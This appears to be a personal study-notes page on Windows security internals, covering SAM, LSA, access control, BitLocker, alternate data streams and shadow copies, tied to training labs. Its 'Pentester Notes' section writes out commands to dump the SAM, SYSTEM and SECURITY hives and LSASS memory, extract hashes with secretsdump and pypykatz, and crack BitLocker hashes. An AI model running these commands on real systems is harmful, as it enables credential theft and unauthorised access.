# Windows Security

[![windowsfundamentals3xzx](../../../cybersecurity/_badges/thm/windowsfundamentals3xzx.svg)](https://tryhackme.com/room/windowsfundamentals3xzx)

<div class="row row-cols-lg-2"><div>

Windows has built-in tools and features to increase the security and reduce the attack surface exploitable for hackers.

Formerly known as Windows Defender, Windows Security provides features to help ensure the safety and privacy of the system.

* 🪲 Antivirus
* 💰 Ransomware protection
* 🔫 Network Firewall
* 🔒 [SmartScreen](https://learn.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-smartscreen/microsoft-defender-smartscreen-overview)
* ...
</div><div>

It's important to keep the operating system [up to date](/cybersecurity/blue-team/topics/updates.md). Windows Update is responsible for downloading and installing them.

Updates are usually released on the 2nd Tuesday of each month, which is often called "Patch Tuesday."

You can open Windows Update from a terminal using: `control /name Microsoft.WindowsUpdate`.

Microsoft frequently releases [security updates](https://msrc.microsoft.com/update-guide/en-us) for their products.
</div></div>

<hr class="sep-both">

## Authentication & Authorization

<div class="row row-cols-lg-2"><div>

#### Security Accounts Manager (SAM)

[![windowsfundamentals](../../../cybersecurity/_badges/htb/windowsfundamentals.svg)](https://academy.hackthebox.com/course/preview/windows-fundamentals)
[![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
[![windowsfundamentals3xzx](../../../cybersecurity/_badges/thm/windowsfundamentals3xzx.svg)](https://tryhackme.com/room/windowsfundamentals3xzx)

The SAM (Security Accounts Manager) database is a local database present on every Windows computer. It is used for authentication. It stores account information including usernames and password hashes.

Modern versions of Windows use the NT hash format, commonly referred to as NTLM, as the previous format was LM.

The database is stored in: `/Windows/System32/config/SAM/` <small>(admin-only)</small>.

📚 The SAM database is mounted in the registry at `hklm/sam`.

⚠️ The SAM database is often partially encrypted using SYSKEY.

#### SYSKEY, Bootkey, and System Hive

[![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)

SYSKEY is a security feature that partially encrypts the SAM database with a key to protect against offline cracking.

* SYSKEY define the configuration of the bootkey
* The bootkey is the key used to encrypt the SAM database
* The system hive contains the bootkey.

📚 The system hive is stored in: `/Windows/System32/config/System/` <small>(admin-only)</small> and mounted in the registry at `hklm/system`.

#### Security Hive

[![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)

The security hive is used to store security configuration, but it's also used to store cached domain-joined credentials.

📚 It is mounted in the registry at `hklm/security`.
</div><div>

#### Security Identifier (SID)

[![windowsfundamentals](../../../cybersecurity/_badges/htb/windowsfundamentals.svg)](https://academy.hackthebox.com/course/preview/windows-fundamentals)

Each object (user, service, etc.) that can be authenticated is called "Security Principal," and has a security identifier (SID). They are used to verify that the user is authorized to an action.

A SID is a concatenation of a domain identifier and a relative identifier (RID). They start with `S-`. The last  hyphen-separated value is the RID.

```ps
PS> whoami /user
PS> wmic useraccount get name,sid
```

#### Access Control

[![windowsfundamentals](../../../cybersecurity/_badges/htb/windowsfundamentals.svg)](https://academy.hackthebox.com/course/preview/windows-fundamentals)
[![windowsfundamentals3xzx](../../../cybersecurity/_badges/thm/windowsfundamentals3xzx.svg)](https://tryhackme.com/room/windowsfundamentals3xzx)

The access to any resources is managed by Access Control Entries (ACEs) in Access Control Lists (ACLs). An ACL is a set of ACEs.

Each ACE specifies the permissions <small>(R, W, X, etc.)</small> granted or denied for a particular user or group <small>(a SID)</small> over a "securable object". A securable object refers to a resource that can be secured <small>(files, services, etc.)</small>.

A security descriptor is a data structure associated with a securable object. It contains information such as:
 
* **Discretionary Access Control List (DACL)**: A list of ACEs 
* **System Access Control List (SACL)**: Optionally, a list that specifies which security events should be audited.

#### Local Security Authority (LSA)

[![windowsfundamentals](../../../cybersecurity/_badges/htb/windowsfundamentals.svg)](https://academy.hackthebox.com/course/preview/windows-fundamentals)
[![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
[![windowsfundamentals3xzx](../../../cybersecurity/_badges/thm/windowsfundamentals3xzx.svg)](https://tryhackme.com/room/windowsfundamentals3xzx)

The Local Security Authority (LSA) is a process responsible for security-related functions in the operating system.

* Authenticating users
* Enforcing security policies
* Generating access tokens <small>(contains security information such as privileges, used by processes/... to authorize users)</small>

It's managed by `lsass.exe`, the Local Security Authority Subsystem Service (LSASS).
</div></div>

<hr class="sep-both">

## BitLocker Encrypted Drive

[![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)

<div class="row row-cols-lg-2"><div>

BitLocker is a full disk encryption feature on Windows. We must unlock the drive at boot in order to read its contents.

* 🌱 USB key
* 😎 Pin or Password 
* 🍷 Trusted Platform Module (TPM)
* ⚠️ Network Unlock

A recovery key can alternatively be used. It's a randomly generated 48-digit string of numbers. It can be saved on [Active Directory](/operating-systems/cloud/active-directory/_knowledge/index.md), on your Microsoft Account, on an external drive, etc.
</div><div>

Bitlocker needs the drive to have two partitions. The first partition has the necessary files to start the system, while the other has the full operating system and our files.

Assuming you mounted the locked partition in `/dev/xxxp2`:

```shell!
$ # unlock and map in /dev/mapper/mytag
$ sudo cryptsetup bitlkOpen /dev/xxxp2 mytag
$ sudo cryptsetup bitlkClose mytag
```

You can extract the user password (`$0`/`$1`) or the recovery key (`$2`/`$3`). You can then try [hash cracking](/cybersecurity/cryptography/algorithms/hashing/index.md#hash-cracking) or [bitcracker](https://github.com/e-ago/bitcracker) <small>(0.7k ⭐, 2021 🪦)</small>.

```shell!
$ # https://openwall.info/wiki/john/OpenCL-BitLocker
$ bitlocker2john -i xxx.vhd > myhashes
$ grep "bitlocker\$0" myhashes > myhash
$ hashcat -m 22100 myhash wordlist
```
</div></div>

<hr class="sep-both">

## Windows Pentester Notes ☠️

<div class="row row-cols-lg-2"><div>

#### Credentials Gathering (Static)

[![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)

If you have enough privileges to access the registry <small>(not necessarily admin, but not a normal user)</small>, you can dump the three hives:

```ps
PS> reg save hklm\system C:\XXX\system.hive
PS> reg save hklm\sam C:\XXX\sam.hive
PS> reg save hklm\security C:\XXX\security.hive
$ nxc smb IP --local-auth -u xxx -p yyy --sam # remote dump
```

Use [file transfer methods](/cybersecurity/red-team/_knowledge/topics/file_transfer.md) such as SMB and [secretsdump](/operating-systems/networking/protocols/tools/impacket.md) to dump them. We would then try to [crack](/cybersecurity/cryptography/algorithms/hashing/index.md#hash-cracking) or pass the hash.

```shell!
$ impacket-secretsdump -sam sam.hive -security security.hive -system system.hive LOCAL
```
</div><div>

#### Credential Hunting (Dynamic)

[![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)

You can also dump credentials saved in process memory. There are two methods: dumping the LSA process and analyzing it on Linux OR dumping and analyzing the result on Windows.

* Dump LSA Process <small>(Admin Shell Required)</small>

```shell!
$ tasklist /svc | findstr "lsa"
lsass.exe          4242
$ Get-Process lsass | Select Id
  Id
  --
  4242
$ rundll32 C:\windows\system32\comsvcs.dll, MiniDump 4242 C:\lsass.dmp full
<detected by antivirus>
```
```ps
$ nxc smb IP --local-auth -u xxx -p yyy --lsa # remote dump
```

Lastly, you can also open the task manager, right-click on the LSAP process and select 'Create dump file.'

* Analyzing LSA Process Dump on Linux using [pypykatz](https://github.com/skelsec/pypykatz) <small>(2.6k ⭐)</small>

```shell!
$ pypykatz lsa minidump lsass.dmp
```
</div></div>

<hr class="sep-both">

## Random Notes

<div class="row row-cols-lg-2"><div>

#### Alternate Data Streams (ADS)

[![adventofcyber2](../../../cybersecurity/_badges/thm/adventofcyber2/day21.svg)](https://tryhackme.com/room/adventofcyber2)

On NTFS filesystem, ADS allows files to have more than one stream of data. By default, every file has one stream called `:$DATA`.

```ps
PS> Get-Item -Path SomeFile -Stream * # list streams
PSPath        : Microsoft.PowerShell.Core\FileSystem::XXX\toto.pdf::$DATA
PSParentPath  : Microsoft.PowerShell.Core\FileSystem::XXX
PSChildName   : toto.pdf::$DATA
PSDrive       : XXX
PSProvider    : Microsoft.PowerShell.Core\FileSystem
PSIsContainer : False
FileName      : XXX\toto.pdf
Stream        : :$DATA
Length        : 0
```

They can be used by Windows to store data, such as identifiers telling Windows that this file was downloaded from the Internet.

Hackers can use that to store malicious code inside a file. This code may be executed by a vulnerable application loading the file.

```ps
PS> $(Resolve-Path .\file.exe:stream) # vulnerable PS call
```
</div><div>

#### Volume Shadow Copy Service (VSS)

[![password_attacks](../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
[![adventofcyber2](../../../cybersecurity/_badges/thm/adventofcyber2/day23.svg)](https://tryhackme.com/room/adventofcyber2)

The Volume Shadow Copy Service (VSS) is handling the creation, and management of shadow copies/snapshots of the data backed up. 

It stores data in the "volume information" of each drive that has the feature enabled. They may allow a system admin to restore the system after an attack. Hackers will most likely check them and delete them.

To manage them, right-click on a hard-drive, and select "Shadow copies." Shadow copies can be stored externally.

➡️ See also: [Volume Shadow Copy Service](https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service).
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

[![windowsfundamentals2x0x](../../../cybersecurity/_badges/thm/windowsfundamentals2x0x.svg)](https://tryhackme.com/room/windowsfundamentals2x0x)
[![windowsfundamentals3xzx](../../../cybersecurity/_badges/thm/windowsfundamentals3xzx.svg)](https://tryhackme.com/room/windowsfundamentals3xzx)

* lusrmgr.msc: can be used to find entrypoints (weak passwords, groups with too many perms)
* msconfig (find malware?)/winver (outdated?)/control system (open ports...)/msinfo32 (outdated?)/compmgmt (scheduled tasks...)/regedit (misconfiguration...): info can help in find vulnerabilities
* UserAccountControlSettings: identify weakness
* PowerSploit...
* Mimikatz...
* Microsoft Security Compliance Toolkit (SCT)
* CIS-CAT
* Microsoft Defender Application Control
* device guard
* applocker
* Hiren's bootcd
* [SASE](https://www.microsoft.com/en-us/security/business/security-101/what-is-sase)
* sysmon
* [Introduction to Alternate Data Streams](https://www.malwarebytes.com/blog/news/2015/07/introduction-to-alternate-data-streams)
* [Windows credential guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-how-it-works)
</div><div>

* Windows Tilde Filenames (Refer to IIS)
* Windows Defender Firewall
  * Block access to share if not in the same workgroup?
* Application Whitelisting 
* AppLocker
* Local Group Policy (gpedit.msc)

```ps
PS> # list enable protection settings
PS> Get-MpComputerStatus
PS> Get-MpComputerStatus | findstr "True"
```
</div></div>